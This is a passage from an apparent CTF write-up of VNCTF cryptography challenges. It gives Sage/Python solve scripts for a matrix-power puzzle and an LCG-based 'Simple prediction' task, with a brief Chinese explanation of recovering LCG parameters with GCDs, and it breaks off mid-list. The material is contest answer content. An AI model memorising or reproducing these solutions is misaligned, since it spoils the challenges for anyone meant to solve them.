<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">106743081253087007974132382690669187409167641660258665859915640694456867788135702053312073228376307091325146727550371538313884850638568106223326195447798997814912891375244381751926653858549419946547894675646011818800255999071070352934719005006228971056393128007601573916373180007524930454138943896336817929823</span></span><br><span class="line">G = Zmod(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">L = Matrix(Zmod(p),[</span><br><span class="line">    [<span class="number">5</span>, <span class="number">1</span>, -<span class="number">5</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">5</span>, -<span class="number">1</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>]</span><br><span class="line">])</span><br><span class="line">vec1 = (<span class="number">2025</span>,<span class="number">208</span>,<span class="number">209</span>)</span><br><span class="line">vec2=(<span class="number">17199707718762989481733793569240992776243099972784327196212023936622130204798694753865087501654381623876011128783229020278210160383185417670794284015692458326761011808048967854332413536183785458993128524881447529380387804712214305034841856237045463243243451585619997751904403447841431924053651568039257094910</span>, <span class="number">62503976674384744837417986781499538335164333679603320998241675970253762411134672614307594505442798271581593168080110727738181755339828909879977419645331630791420448736959554172731899301884779691119177400457640826361914359964889995618273843955820050051136401731342998940859792560938931787155426766034754760036</span>, <span class="number">93840121740656543170616546027906623588891573113673113077637257131079221429328035796416874995388795184080636312185908173422461254266536066991205933270191964776577196573147847000446118311985331680378772920169894541350064423243733498672684875039906829095473677927238488927923581806647297338935716890606987700071</span>)</span><br><span class="line">vec1 = vector(Zmod(p),vec1)</span><br><span class="line">vec2 = vector(Zmod(p),vec2)</span><br><span class="line"></span><br><span class="line">M1 = Matrix(Zmod(p),Matrix(vec1).T)</span><br><span class="line">M1 = M1.augment(L*vec1)</span><br><span class="line">M1 = M1.augment(L^<span class="number">2</span>*vec1)</span><br><span class="line"></span><br><span class="line">M2 = Matrix(Zmod(p),Matrix(vec2).T)</span><br><span class="line">M2 = M2.augment(L*vec2)</span><br><span class="line">M2 = M2.augment(L^<span class="number">2</span>*vec2)</span><br><span class="line"></span><br><span class="line">R = M2*M1^(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">gl, P = L.jordan_form(transformation=<span class="literal">True</span>)</span><br><span class="line">gr = P^(-<span class="number">1</span>)*R*P</span><br><span class="line"></span><br><span class="line">g = gl[<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">t = gr[<span class="number">0</span>,<span class="number">1</span>] <span class="comment"># t = ng^(n-1)</span></span><br><span class="line">k = gr[<span class="number">1</span>,<span class="number">1</span>] <span class="comment"># k = g^n</span></span><br><span class="line"><span class="comment">#so gt = nk  -&gt;  n = gtk^(-1)</span></span><br><span class="line"></span><br><span class="line">n = g * t * inverse(k,p) % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(n)))</span><br></pre></td></tr></table></figure>

<h1 id="3，Simple-prediction"><a href="#3，Simple-prediction" class="headerlink" title="3，Simple prediction"></a>3，Simple prediction</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice, randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment"># flag来源</span></span><br><span class="line">flag = <span class="string">b&quot;VNCTF&#123;xxxxxxx&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag)&lt;<span class="number">100</span></span><br><span class="line">FLAG1=flag[:<span class="number">32</span>]</span><br><span class="line">FLAG2=flag[<span class="number">32</span>:]</span><br><span class="line"> </span><br><span class="line"><span class="comment"># part1</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed=<span class="literal">None</span>, a=<span class="literal">None</span>, b=<span class="literal">None</span>, m=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> m:</span><br><span class="line">            self.m = getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> seed:</span><br><span class="line">            self.seed = getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> a:</span><br><span class="line">            self.a = getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> b:</span><br><span class="line">            self.b = getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="comment">#print(f&quot;LCG 初始化参数: seed=&#123;self.seed&#125;\n a=&#123;self.a&#125;\n b=&#123;self.b&#125;\n m=&#123;self.m&#125;&quot;)</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.seed * self.a + self.b) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed</span><br><span class="line">binary_flag = <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;byte:08b&#125;</span>&quot;</span> <span class="keyword">for</span> byte <span class="keyword">in</span> FLAG1)</span><br><span class="line">m = [<span class="built_in">int</span>(bit) <span class="keyword">for</span> bit <span class="keyword">in</span> binary_flag]</span><br><span class="line"> </span><br><span class="line">n=[]</span><br><span class="line">lcg=LCG()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    z=lcg.<span class="built_in">next</span>()</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        n.append(z)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        z=randint(<span class="number">0</span>, <span class="number">2</span>**<span class="number">512</span>)</span><br><span class="line">        n.append(z)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n=<span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>第一部分是个lcg。可以通过VNCTF{的前缀010101100100111001000011010101000100011001111011。会发现有四个连续的0和四个连续间隔1的0.两个分别求出来gcd即可，然后正常步骤恢复参数即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#x1 = 47513456973995038401745402734715062697203139056061145149400619356555247755807</span></span><br><span class="line">x1 = <span class="number">2904118189775120023459019968272518649734695395069048986022437844918703975644558115383392143444650105913452409637755020483723178514755099834451835881760669</span></span><br><span class="line">x2 = <span class="number">2496347446622649570739835604330702398623655492993517020989697292987597836476885607585376289637075420196735804815963859430002179996807900803924440985064670</span></span><br><span class="line">x3 = <span class="number">5092430706888567903864571522791342607274393841524837952939293151143112873052820889489487455424060318331863246280679543283523935851978590240976374837185862</span></span><br><span class="line">x4 = <span class="number">5841875905599158459362419364618142617028730211782981879796170746183188377680781214397263518308193221936236231314886272772334955629812227434225018741466206</span></span><br><span class="line"></span><br><span class="line">x = [ x1, x2, x3, x4]</span><br><span class="line">t = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(x)):</span><br><span class="line">    t.append(x[i] - x[i-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">mt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(t)-<span class="number">1</span>):</span><br><span class="line">    mt = GCD(t[i+<span class="number">1</span>]*t[i-<span class="number">1</span>] - t[i]*t[i], mt)</span><br><span class="line">    <span class="built_in">print</span>(mt)</span><br><span class="line">n=[<span class="number">3112694391042354926773258527503185381065155208766365770810259125227315858273584882915278974659442759713556138602562818381472824625797498323576227136840540</span>, <span class="number">786520206240723735172261009757420248240712167229385012959459782880298311452489264350397371063336640624230104453428663597776321434444090584610343945793660</span>, <span class="number">7754569747576675124444476463859698281135896797237129188325347781614403755633169372944514845375944974591833050594776051023970647718184479538589092026997450</span>, <span class="number">10978871322047154319303427738666909216134180533239441865527547245976955391170539397404213362987538079999656622797569425035497528648628186801889140680115470</span>, <span class="number">415184125088979230381868131662306705231430570032972141500815295250568658520820987452099753091555506318572984156087823561918067558858879113735437647918395</span>, <span class="number">9714366912431081171564906464961880471711707698812491599768023751085458677159777579545968149071317510381545022553352967040864616769551211477245295688346391</span>, <span class="number">8092371024146035837349997948385163397190707017788806800986026897219622319284668919277237868044873010504361887344482864009123696754405451607327057609111440</span>, <span class="number">10436585428619509784309464150307931296272516984470192973796220477752118208825366154709099054615564535911017032120309414411717936665468477272752593939807490</span>, <span class="number">447305603342948150664988784745387699519951434026852127837772145868706495519135216852266467924181573327190271412684871626668438866189143390133743425082693</span>, <span class="number">6258382789539676289638693392356433976508824529535654981585175361893403855873239591388514679492519869137377551632089436526817168965584123817538926883004415</span>, <span class="number">6578459280281502789276376530649184418554320975674197078167114333423000507810642180022772031856026530862489799383804073813561526139629854268000350585566612</span>, <span class="number">3105804271985778113444078016881015352567661906301742072344003729902592834090816086716179301421395002611330071836937959172008751915356371544312148285941397</span>, <span class="number">5127587678416216516561596462057578930989568244549184602544457582445902765146101086132777949114594616892034555102233884229669532953434325912113180385189591</span>, <span class="number">1681442924588151639116433276563473534451382602613595570895775581721843149401494979313072945423375889819333272799813140736767061166995345688865952524678847</span>, <span class="number">6078642869874003200723208932690378645034656959547344879427148548997772820000250634715135248051520273525771098588692142255436403818018608325143275974733955</span>, <span class="number">4012523361150861559330864221313828963018749453209042526129800867368717777138746796940156428780116853299962328653590275670160641449729061424004869739613567</span>, <span class="number">4087452535062195595067394274200281754153594561224879880591706612010600316823470426560921334571972319206745275769663537296296835581079110402423097667972149</span>, <span class="number">11987901353675361726480103030921089210449430771045316299988549316092607271793911250199421541491725415392936441323452384413917894329798638712720319592293030</span>, <span class="number">2904118189775120023459019968272518649734695395069048986022437844918703975644558115383392143444650105913452409637755020483723178514755099834451835881760669</span>, <span class="number">2496347446622649570739835604330702398623655492993517020989697292987597836476885607585376289637075420196735804815963859430002179996807900803924440985064670</span>, <span class="number">5092430706888567903864571522791342607274393841524837952939293151143112873052820889489487455424060318331863246280679543283523935851978590240976374837185862</span>, <span class="number">5841875905599158459362419364618142617028730211782981879796170746183188377680781214397263518308193221936236231314886272772334955629812227434225018741466206</span>, <span class="number">8822998220509619232900481169697664481537213687243135055737490918324236635625751932015349246530733060787880922400103357011039056263913931100456275760018751</span>, <span class="number">1829427301393099155994835313687991302426344894851330147851048073570161235032513979807480344356619367183014749159832405667673629599879026930073212395410824</span>, <span class="number">8874937378716753576850453573789326249003541019039439656124625436218713023501508466125664186477683313567607343263520908371451243118020424774779416613284431</span>, <span class="number">3094214719436429226961245919063208815398034554284969326313725322674015836263311873059825341599355295801961834907564360317827855287772012048456233770648414</span>, <span class="number">2272952363017630559556957955923359020608484345799712462629628170648722715295981120790102876295983654085449309744008793129064000312354978267334570450316580</span>, <span class="number">6496050086593645326490832279816459396921735500995471620086880796676279174314036559957741604751933054571983936020744588504368950464191967946656677942899021</span>, <span class="number">2908005781806019194373618893842561631858638383291599116857909669689194340479675737346427303495425892274736979677443740297777253232987190979789663078725548</span>, <span class="number">5388837765013859349244026248246407908254127661532056349880470355375929571123210403251766195449198851516630257699755053971912164119717459739252423955246030</span>, <span class="number">3932085435203368987040270370169028458481400198383481987063012025485880158374650852938797303847848555222501161881776438272815556194118123494398521291295697</span>, <span class="number">1596085666232061421423007114092508353792922600947831965835268732144143785280657330672864972239387627022937511560443766910692107622093754834918341508104599</span>, <span class="number">10892117681611280686941153150032271985229693373387407787226285542508269134168395045669092626668774409502094484729473636367607949115031549276342640669975082</span>, <span class="number">12381058972410501723509665604849175514380953105941348450275208477068514082229866560978025193499168665996771831648645890812123306116098698670457035525902659</span>, <span class="number">9545745033067721027306889070190247803420756540371596488987366683285356423973234015839573919673127328959418729409177485348542588655200727033820634115195595</span>, <span class="number">4479761395800283662690601296359321028679912967664335513079404387374415137823818474235937843015783541121766513461305964218999844148219102416295681398216273</span>, <span class="number">9156731911027542367340528717851854633542405024204364589600569440610994301305995711122403415955733016864883934476560189254464831525094631266907727317565841</span>, <span class="number">12666226165843230393234580593668809584406452210553760075587696529746311224658137054868869675868832265128577423471263099176912917347422711319558934937736129</span>, <span class="number">7737065667550567883921030156559155888807672386984437450593392652512287661221384706140560800013674012584773711581005691186997689622045412989344796050391287</span>, <span class="number">10722711925660632865003648114617468567460695864602168315375920133514224919874108904883202493206779150508025208748543209001260228655832044340651286693647050</span>, <span class="number">7221989584178899171245167344240261714028153334248896620632489515820094543095415471986280548321052175500724972199931711569861834778349006061026371650725530</span>, <span class="number">5886738574662494886015789010409089525104778409243680958758049475066582248064522621093649220502324554901044951352389897351932045257540701040679720673182995</span>, <span class="number">3233031164922457118197051143257856436060509168643015516594248999051329950677781355031891194479912736553900235538373437012785908680742480354059763051926316</span>, <span class="number">6920408828532601456551620626263287997391364853554222851307650268338227244737275020409310347012172074480549705970215944641795584739931068420792592364550052</span>, <span class="number">345138692120754413974989722062354894985124386853626820051983950290560303295350640053596083432413833430615738137403155513172015508429643499448532812238302</span>, <span class="number">6496124631023407996096728606763442237866253608920412620007859687219366730708253684245052162774841972751074153467713038103511069685477261845614949446512946</span>, <span class="number">4954508795303987697183186252875587490356341561311441407925804955497204676368654384148988141783982847353089058481160501471777024753759971112068258113214565</span>, <span class="number">3828140752986076468811884163754926568598858918798535569519010381565163308453577351104319634076150030767168383992404786769678070072803711746311572209192530</span>, <span class="number">1525344587067629160366462540930365317799240672047761683713335407426899660409450594374673147296233196946100880479779947899945565197770752720138099788100242</span>, <span class="number">5602028537128071394937385481766099952197676084096530706435200857779681493800600692877392655529445220731489748219807533708510871522082289298454440537081195</span>, <span class="number">8405125104396694306214164667837515476489019008711529371739198500339529156031577667955991513091455659686200628433501522614373035120915300556389897983235246</span>, <span class="number">9363664670977587308719921639117126893427493571952598074398598354833859096850631443468609493097644882813856223675425304811178510077132476076498042910645127</span>, <span class="number">9349867197915693633449346578490899128090370835059777452440405839315024154505729422754698383796886447011859369467724281722489773749407392509326759291555650</span>, <span class="number">3097954855336969231133966616412205217720272446131201205394739397914294852319995680869512637191028462644642196360432400206940604220726553888843484631971992</span>, <span class="number">7406758029368015050095014975336874387267990662428684874055990633074940508414476853156912578698644499480936056505695505471874708394209454863202578629044781</span>, <span class="number">5898320635400000335689178353860464283085294033102742946598413410403566655371101483965016006968842853067086240043017626407973320006397434327924399698861420</span>, <span class="number">3828259549886515897088733478568758658537872498350930339786355733127243099368094714942597822674100789401305391925244644463002021967786404115828714481532179</span>, <span class="number">10066554692829027637519103501291436097875302262643471195009455832708625591378453822850465340538716551878294551013391681787809106196783898118863498888850156</span>, <span class="number">3499720133059334106382868629152269068830644098994082476913546750309451292524899143926086345071167411724519536123368519961201709328076205428843169312885318</span>, <span class="number">1147510368324353143366569189557814239414538057284528926807572528742387641385961348284337024920835614354163427666397191709805222814485017032618600205989876</span>, <span class="number">1376443474120809546746657939759253350130433377066673914731313628744658444788621480850904944725428749861684141267366595703293257102033695543353727831255656</span>, <span class="number">1306141012932794251921296999513356011857879354957485278247781515633351554530888210035582022397642308827310053200134973752059059882857529726355628496875096</span>, <span class="number">413876320654674539071498590563731546775652768958703825687302348932338816891646970452489274333920514493304821523049953031604718378578195970800635452979649</span>, <span class="number">7136032318103206577710213656015300850977662493466951627466129080713148099950022004835515732817999372224984465182016765597112698961144220566693638971519180</span>, <span class="number">1756926746502930493055390730808057897946636149296690801994682335268478289364240082508380322318466774154683071200098564629218083632205594961758297148916941</span>, <span class="number">3316411454937759862626366549533032628711020533003169223587018450894240524473337491784683315945222404515083081588061970401834062233395245203672377474101840</span>, <span class="number">7599211346182071240062546116924978763380850815873927487248272261113823566573995151834356651681181867857513566992756113461907517519948807226796425859877955</span>, <span class="number">4827401360947748134984560117351749331549293418478129984842609599519150402230303738934321974655033540771922561714741710181107247544509276801554867550554777</span>, <span class="number">9961447244710994569376297896009391492177427465332112375195390069257789445371437839302033237974987420665106837111388126490588618960984274087531285094868463</span>, <span class="number">3970825380935714034877349217971517028903515186410921713051743479793055944068011846527177266662364107500948837234030225959118382828207676389015192534929256</span>, <span class="number">8608544722853283040859357355424248470567969517050350679760824632753430693341742456610190512333547560909838869247382450069074859055253804037930976168108964</span>, <span class="number">3997948190249595469689902562163983268236884055830515360341250116190801555461654583247875794079436239650479700066689264532083273326700382295037787195625271</span>, <span class="number">3017769504296172462769603649703609973556946564740463758564555635077678423150496052443226378694972314861078002173292765046041599543542556913918523347263353</span>, <span class="number">3018202344977285583885683841870491872320206187912942548780004839181579922416791687842887038054070620041342514501089785820834677670579439549543511926064647</span>, <span class="number">9891097413298322102982137409604486446161539669050452171012014240832941475729480282491230607708654307021437081745156282474575662423373832233207415281381073</span>, <span class="number">810743817397722331080383625060943517758354327434640227828749606831684964655697897139622679395918034416371573980787570599833348592060893531005764737629127</span>, <span class="number">1969958301963944803918256770227669804705344374646067381549018696813216352795715044244066646943740977361192247676332396646834038434975510833138637230427345</span>, <span class="number">772283527249875882597408338501459146497878473259395153877255706812399634121008456441522976339316844330687671179329753370897387217142932695296763732889342</span>, <span class="number">3493198662567460016868275788342486589147435611953915935411231579476989982638489118458485903871892142501116430468467002727878349586906097406405889235323788</span>, <span class="number">4521188033318754929745682253319078580979772923679656226706453809441157032758310389926223236904310972501023754771832793204339998846509477714808315607910281</span>, <span class="number">1459294332771505218116793124065248690329063109957541959485115472870135095063108761273775418742597190233931321103250699825789092987319750533970824729614370</span>, <span class="number">6081872280435119283055308076930153339025042098756094797625575179794067581927871061960272319874202717615426152212739549866438480879214105498282015894463289</span>, <span class="number">7762130387850161469171952821282759615477419337477617017933774362212895431284831425608213005612250003857841615618062878428976530194088816674767021581918361</span>, <span class="number">7088966648042419634447311723094936418341229460114395537643458905920051387153662615102678231749704070491616519620338946004408977647690235277763140459513851</span>, <span class="number">8530607388577471706676549252322039165843846873546376646134620680688465635242428455911769685950893069368467175196898490905630827271869358438258138367147920</span>, <span class="number">8175683960847863703233560555156381607096304894990424846512919663587601289791899748077484807672241130846328052701521081221552165331340951019312677944858747</span>, <span class="number">2488623773922039763673766132557696145161284575280912275615079393811226460826881195363265124937419976718725662680265519090252785095524620609995052703783900</span>, <span class="number">6288863230409343367237321449257176176239557761363343791530360335256224431868618032002438377834667134601271040364141807479673109178951459313279813775639777</span>, <span class="number">1473263923409842234507369539073445638835827020429470695919107120414932038000731541162435599563211189312718420865785265955929068440558364834918540634523353</span>, <span class="number">10122097127617668407198385940571219425968555754180743969424837212320822902467269904796129323894867285839753668577231263726601359268499019654139049664492061</span>, <span class="number">1334784462377268162219916937778259079061709480108638225731209555525977073101039827877859407920878225806740943290613416505735060002712675764508538108047998</span>, <span class="number">12943474412664177820782360094982469843501041500422827324429596710070670418547139028323568955260840820805331899161092350732997070023024881720076933509023643</span>, <span class="number">5285767084748000524025756084248068414482830127641006763000905479085771014780726785155236576771987096323025767003001338650450684709507257843571038471056162</span>, <span class="number">11001649396182899266919450751411831463050029968134347011876378247881245085871285736635385336564047956680944211929032745371792404308823898143896080599228135</span>, <span class="number">1301320300483174681160013837223931621343934678403403829386521051889935307860390561329187310217511171817846283842794896111380527530069209283005624028690286</span>, <span class="number">1186915169823582113649731511008826333372778559188698285519935265619430618324050874482684013915987326600510246581904647268399723862559309332791209147350358</span>, <span class="number">7951498363952334154675185909940847757383581919338786100530712059201526109293278830582032249111527249008525526574896069298049360688844794969204346487119319</span>, <span class="number">5833834084743172317761925197221701570183986273711410703784510000739316288591047658081863870594678124768673286740095552226723863847255410312004390417932230</span>, <span class="number">250924904422407061995835179415107794137513805961258172932861317085785803121995475899378133391840809508281610679076388256556411152107191872088591037125680</span>, <span class="number">7085080737844307190711404281467289397811408278819313361734199078382373564224746415235216310673951063158139882956733288219404303997318855194384556303070508</span>, <span class="number">792899170302377369245819488181982727852356501237495658820211983447692560703122438829983042374409125728040070525543893080924041158974511859677083096607042</span>, <span class="number">527158028815181308607570985361245658684704283756590449588667033857582910233360333000310180939827834980467750511349128724495152296557091872597733881952730</span>, <span class="number">3763863417935228217913891578022090207665435628108842338881001530218617625267294739809241731373814499577113686300212286948743727581910857164406047073435145</span>, <span class="number">958455575406045524652006754606401195502921703814444942723242685507533790960715001629170021188825054149374588782230350772396669475019050028532264494574237</span>, <span class="number">9809663619882688389709117706867480374978776635047144310439126194904691403735820159227260919973742961860862039967431466740149997606037421959899675267867402</span>, <span class="number">4928087822912964183306632018065153773912015339056263025033437531290833406852527367467717772039503136111382784824674765619106999131274189533695412345998781</span>, <span class="number">3306590088110759567187299302153921492468384287750726848496785861124840118140562928463000437634919111218431272400680022915536959360708451855996593223449881</span>, <span class="number">2515345284450486657989564309908638223504506708787471236561574408125887414773177664899850115276078830612044843742665254526234379016665896380411170870041898</span>, <span class="number">6134916597901963206086108654185719639522683238742250523950368120774398123587375425774449196409974448759099480799449712533937282087807450665513782605062516</span>, <span class="number">267008464052948389884730662677557220200174254262230501579203365622730336383874495035799286519129165799047086431118526490317359253783923412623429268099578</span>, <span class="number">3800295810128139174303610558671254854105124434132150757436144235620260340163872195459646695446468969827264408515318839301568024785647250539243955185201551</span>, <span class="number">2758490331762821125743858402061695095981818993449415737628690206586999472874851271575996243559646503027769536546139985948732741074951448605054447471168011</span>, <span class="number">4217864104379220244652908183473678097829823483575612233951544943703293030152224382038691961310245629042826444658756962561354248059403145303196082085209268</span>, <span class="number">2411546292849014551581200422109249129122050947218550703776810780058841000449832253829636107587459795899860908579554012266416092559036860375897058675166409</span>, <span class="number">192467681052352162362648778226726733093735914360336666620608894524451640254072987304183265625190436964732828104328784706266808876860847345878920907323799</span>, <span class="number">10212417168067454275584471588910621010044875852180765650348231827095954171511730230293551305771510545238294425677591538289639404143154924489749365048876082</span>, <span class="number">6291496406676715628304428700100747835536008647518931914594365410721760743785935426363197093622520575550738520057474256623894578595520825692491818636334669</span>, <span class="number">1696976360861070329626849480960267540656072393087503300209873513633034266528003865510158759809700233902230575591392391573852821509573062950235240813129994</span>, <span class="number">1992791476006726756711658531188332687379120992528518705617488065186657920940258074136462208677189526448735990314312679768851854906262932750351345930936464</span>, <span class="number">3434817150940057687962615407673182936576770534551677026510420824040773940701984366644277648090615900140073539389288521085696480983123237694035190924420756</span>, <span class="number">1327855956090181552782945714409707635753546680351411598218049923377836087099012280676631016119197258537564513914523176743684952405144923872921314136129035</span>, <span class="number">5655624154789660915581443648297353167129398768268548216939084854177411698912475597846603256287206167209756880556116572180333055932759436594462434353693400</span>, <span class="number">8830059371095862735354543958775333718886412721521896475178007834620722932782486718721540179680672790557809311631084845372799308539284214436640810453484170</span>, <span class="number">1577636678261904797628136271897055906695035001433916913766563447593237424148338744133061689583362391559327011278037905021569850425130860531043753400763154</span>, <span class="number">1209729863382992194970404071607689320320688269277129054249972346057995988562627526632203534824706401031451800965862577190219536998333754410251454193172633</span>, <span class="number">10994737712981198858904493523119510510407890704351172608352260610483503932115022636292742662488652484884065872585569714312792595965194541878114072128785076</span>, <span class="number">13312794948135247102302068858829637693388469161937738162205887768730544767479875477575282537997374804153016347963677479862069345296678731832716900899603869</span>, <span class="number">879671866755667260350450894660321566144270667616606636933510913412039991903800808345026765023248799436411333541403195209188109276098614860327117137466333</span>, <span class="number">5997701046258297701008758042981450104850958281608082374179429160139658833748115292822230978073016551491127587310846341263896220866877950242984465975300314</span>, <span class="number">4192012991959368360991053529958905352101679048106150398842439746093082099247853769361916275353786757483092523746395483254419836006982430015840596420354690</span>, <span class="number">68767193809701848990678228150938858317438882331616019798227278054229929116354514010496742914593903938654686226703764027981691726307067924749548639740514</span>, <span class="number">6424878254160617279031510897227083875408892211834672818183106791194425743856659680167277082328488376798715553566764040288391365020947404294241085942635290</span>, <span class="number">5763317249464667765660677954026422164094163991588225333425943132102988790548347316637489825630840144712298171981025912010655441215703984407721949790844665</span>, <span class="number">9435550610931315332910244565308657822031673972676538747748776968398830747049322827689121854214080946112570463640185481340896982590325205419757695986071062</span>, <span class="number">10854423772658513176079671341132085265897789527203502433443146288938098731162432093760781299761018039572586033382650624844107074319936079541582027150668547</span>, <span class="number">12476951609313059069935100486664524689307116697672515206640540269281371069630100802734228826553881969126349796880152061952354015124626549756257692927815280</span>, <span class="number">8045796521414377185855048953350733531835029059717165499998684525057576005480100656824730185029760232662916675149548562588330925933690413287605746764047837</span>, <span class="number">7525718525168133704091970516222857259732335150600005652272906993418956544265228434139051120334482938422989961682491729150475586713499313679353043034729340</span>, <span class="number">11912046156711704412939411921254931438505716185767663797722530582823134713864014317449272059238099311015018796287244119043500568755668077884967429950325307</span>, <span class="number">4110376054901462563412017964610800633712664567375745109340224846052194476233004966740187585207654361057339454338701161199087672786000039131447606734749596</span>, <span class="number">10536181172701505461141355483962316021670309715632294804091924062622834181954003809472637335749074818053519805212673316386352637871822409277633843138677100</span>, <span class="number">6561239288740833507622012494260145838556069026796406502850578760529949619677685073606417050067995286214075860389141224570430897217267888191050083989435618</span>, <span class="number">10755390470562648902207547773646277461044027331578910788260151451952594114771257491457728262192103389098572788952846896691668034250236775730674370420267582</span>, <span class="number">10116754295180959057177541778544392071102857895532245112951561295322574582916144106425865580948674586957980113764584475972905926764533180433076299516058008</span>, <span class="number">5859608878417010984159585842628477069743251659783200679637533418043397666877873263920551182367857303131476266606376419613220550151623797364003280753673346</span>, <span class="number">9610161406190042620740875536112128010400982062708691775804712654931587490639820436686157097516436685664421116711173966237809547051696258177713532759654622</span>, <span class="number">12952646859219149057230927632784421545288507757341307005625287549328732462625896748866127565993868137664264482594593443044220358257862250213102226764516290</span>, <span class="number">8743024327867380639354449145506317134407105263681845312476151158834148293426515624801487795913107735337606303607388242940871402388276005920082857880323995</span>, <span class="number">6528451843739479102149304425458509059040659785241941228418879086912730488517357726536788993512031451564270545373930206730980948931647991797715441531367741</span>, <span class="number">10462017518740882728109987348635133411529189768079438410766717066737589074298615526836492547944144729306982384205899274858973867537303267274981230305808532</span>, <span class="number">1029921233837757648214250672123683540325541346243252184272242917208678427506067856700714176359513176639295219124015583282618724736476654390655108055903101</span>, <span class="number">3813391349261399004318771186005512948966760302080394751195459215339735976452080345673275015650542987881482072724697347920803923279413761484112487853082830</span>, <span class="number">5567045996050241673395722528384148064949240335449353538914263526561311052170653310179306144459952167489810559452323829738704071952158894333072311035879031</span>, <span class="number">11425297405286583197291193457049007771696095735039713556631639136073340052097230007416451599300613472366227651608125018305022847691340936237133967669922708</span>, <span class="number">5133133934348577917601648370305907274443352706523623096373752926891789513077352342509229421888477870704293827297467947756322460298412074338824202790298662</span>, <span class="number">8132583894883560743002824283673059816431507792390355426553765264038429014617881701178853548832309971139375526867381359198874199379920890215643413694501114</span>, <span class="number">7552142578261419245883966416284664466068563874971828329265494939813613106787130369752313075539493006907320849655211358140332918600081468802258749834843538</span>, <span class="number">10823636389049155729021217698235275011474838951652434077924344160818782418898312855943115619327929826005003323014892881057453251153402725743243234607047481</span>, <span class="number">10680178872406574919448166931611181564572199628533089837843429528532479999287256411849181801583448430894803286171601591142410846251190917672344726710377690</span>, <span class="number">2168298508401712132947640264694148303021343901549723681847049388089284984960261031735310672636540039445007659961609332757733555056471192184304623785463060</span>, <span class="number">2340178702773145350053705740794686678526767806446745613453910417043858008824651357776795006402716690334747276104571962770647451951039149700422444698013803</span>, <span class="number">3676298624367829693533841137950983513080397676021901937554619358758723840281650362664181823578881504253223943310514005188069688898221486997715937242429797</span>, <span class="number">9132445874585857701581851483501762197628317164635776743478088760576246356597389927572170525395684109023421565467382333814897575731125181545766414622099088</span>, <span class="number">1236243137925014415166903810601870684462468132447802699390566421129254384151914584169607594049615635949605059072399537399196990015228436722954103224215653</span>, <span class="number">13192075450313439458696227018221283192704089241176023475321514991073667203620836604426092029969501285268881185351240634985221491469526250478508196558288498</span>, <span class="number">13340639364100809037776647351288754791685500736266676042688472470296642180440487353725930118463893112749814096941496617412376513086275610553120671630855204</span>, <span class="number">12822843338691780139685033864703978550175201484982849212488267516822394414700586371148840548146427825919367884837033694191706187378673985360389045663493646</span>, <span class="number">613106102654076279293510245332160984832690077838123347459270922197015039375289301009491620920230388814580074219177117250380323403794569894216049212572690</span>, <span class="number">741345937780857867091204599859352029451792145933730037837181240026649690120879085854889380733270227213298956191657614314852656479913545582102949822350846</span>, <span class="number">1521203700405106530197194619784591552753988412072513286448479570991121637695991136022481083784343736454948481506227221936397006695094004044673618612260312</span>, <span class="number">1754355644745564738949734138715924818354376481147066751091700288494806267133747040362706809811119196525834164870547295032589624983098331611544467054571960</span>, <span class="number">10558001053790364799640017455585652553441324388003654829669801584264580378288544204384753221615914991531668321760943152912316734446688653889285671939949283</span>, <span class="number">8952741946129854526912282277915463308468641280017071764259400267418376820661617976517595294079266170889791671184248228428255231332246048645399218317435238</span>, <span class="number">5708781767915765818163443178888330089981502372897875606734905301563903280544280090906008214416992941521745475840179246419033248441594273683211971541021513</span>, <span class="number">11207314260945436219908495655323292893171390697333283188618347144146103399541626933000695557155317908996729464557230693586167154225916228852820347109587442</span>, <span class="number">4768699522653814083595511380194045011712422474943867445270805763976679774502355033727862959062082708142553518870516687367912845280877553823018516820468426</span>, <span 